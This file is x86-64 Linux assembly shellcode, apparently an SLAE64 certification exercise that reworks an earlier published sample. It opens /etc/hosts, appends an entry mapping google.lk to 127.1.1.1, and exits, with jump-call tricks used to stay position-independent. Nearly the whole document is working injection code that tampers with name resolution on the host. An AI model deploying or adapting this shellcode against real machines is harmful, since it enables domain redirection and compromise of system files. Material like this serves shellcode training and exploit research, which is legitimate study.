; Author : SLAE64-PA-6470 (kahlon81)
; Date : 2018/02/21
;
; Linux/x86-64 - Add map in /etc/hosts file - 102 bytes
;
; nasm -f elf64 shellcode-896-polymorphic.nasm -o shellcode-896-polymorphic.o
; ld shellcode-896-polymorphic.o -o shellcode-896-polymorphic
;
; Title: Add map in /etc/hosts file - 110 bytes
; Date: 2014-10-29
; Platform: linux/x86_64
; Website: http://osandamalith.wordpress.com
; Author: Osanda Malith Jayathissa (@OsandaMalith)

global _start
    section .text

_start:
    ;open
    xor rax, rax 
    add rax, 2  ; open syscall
    xor rdi, rdi
    xor rsi, rsi
    push rsi ; 0x00 
    
    jmp call_shellcode 
shellcode:
    pop rdi

    xor rsi, rsi
    add si, 0x401
    syscall

    ;write
    xchg rax, rdi
    xor rax, rax
    add rax, 1 ; syscall for write
    jmp data

write:
    pop rsi 
    mov dl, 19 ; length in rdx
    syscall

    ;close
    xor rax, rax
    add rax, 3
    syscall

    ;exit
    xor rax, rax
    mov al, 60
    xor rdi, rdi
    syscall 

data:
    call write
    text db '127.1.1.1 google.lk'
call_shellcode:
    call shellcode
    hosts: db '/etc/hosts'